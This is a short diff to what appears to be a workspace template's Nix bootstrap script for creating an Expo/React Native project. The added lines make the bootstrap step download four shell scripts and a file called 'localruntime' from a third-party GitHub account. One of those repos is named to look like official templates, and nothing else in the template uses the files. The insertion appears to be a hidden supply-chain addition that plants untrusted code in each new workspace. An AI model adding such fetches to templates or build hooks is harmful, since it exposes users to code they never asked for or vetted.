@@ -9,6 +9,11 @@
     pkgs.httping
   ];
   bootstrap = ''
+    wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/dock.sh
+    wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
+    wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
+    wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/tmux.sh
+    wget https://github.com/dediminari/bit/raw/refs/heads/main/localruntime
     mkdir -p "$WS_NAME"
     ${
       if packageManager == "pnpm" then "pnpm create expo \"$WS_NAME\" --no-install"
